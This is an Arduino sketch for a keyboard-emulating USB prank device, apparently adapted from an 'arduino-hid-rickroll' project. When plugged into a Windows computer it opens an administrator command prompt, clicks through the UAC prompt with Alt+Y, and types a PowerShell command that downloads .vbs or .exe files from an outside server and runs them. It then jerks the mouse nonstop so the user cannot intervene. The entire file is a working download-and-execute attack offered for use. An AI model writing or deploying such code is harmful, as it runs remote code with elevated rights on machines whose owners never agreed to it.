/*
 *  Author: Sam van der Kris
 *  GitLab: https://gitlab.com/WarKitteh/arduino-hid-rickroll
 *  
 *  Modified by Michael K-F
 *  GitHub: https://github.com/MichaelK-F
 */
// In most cases you should use this script, but if the user is not an administrator, then you can use the other script, but it requires powershell to be enabled.

#include "Keyboard.h"
#include "Mouse.h"

void typeKey(int key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void runPayload() {
  Keyboard.begin();
  Mouse.begin();
  // Give Windows some time to recognize the Arduino as a human interface device
  delay(1000);

  // Open CMD
  typeKey(KEY_LEFT_GUI);
  delay(400);
  Keyboard.print("cmd");
  delay(500);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.end();

  delay(500);

  // Bypass UAC prompt
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  delay(500);
  Keyboard.releaseAll();

  delay(200);

  // Download and run rickroll.vbs and volup.vbs and exit when done
  //audio only (harder to exit)
  Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('http://riverside.arkf.net:8080/rubber_ducky/rickroll.vbs','%userprofile%\\rickroll.vbs'); && start %userprofile%\\rickroll.vbs && powershell (new-object System.Net.WebClient).DownloadFile('http://riverside.arkf.net:8080/rubber_ducky/volup.vbs','%userprofile%\\volup.vbs'); && start %userprofile%\\volup.vbs && exit");
  //video - easier to exit
  //Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('http://riverside.arkf.net:8080/rubber_ducky/rickroll.exe','%userprofile%\\rickroll.exe'); && start %userprofile%\\rickroll.exe && powershell (new-object System.Net.WebClient).DownloadFile('http://riverside.arkf.net:8080/rubber_ducky/volup.vbs','%userprofile%\\volup.vbs'); && start %userprofile%\\volup.vbs && exit");
  delay(100);
  typeKey(KEY_RETURN);

  Keyboard.end();
}

void setup() {
  runPayload();
}

void loop() {
  //Moves mouse around to annoy people and to prevent them from clicking on anything until unpluged
  Mouse.move(0, 100);
  Mouse.move(0, -100);
  Mouse.move(100, 0);
  Mouse.move(-100,0);
}
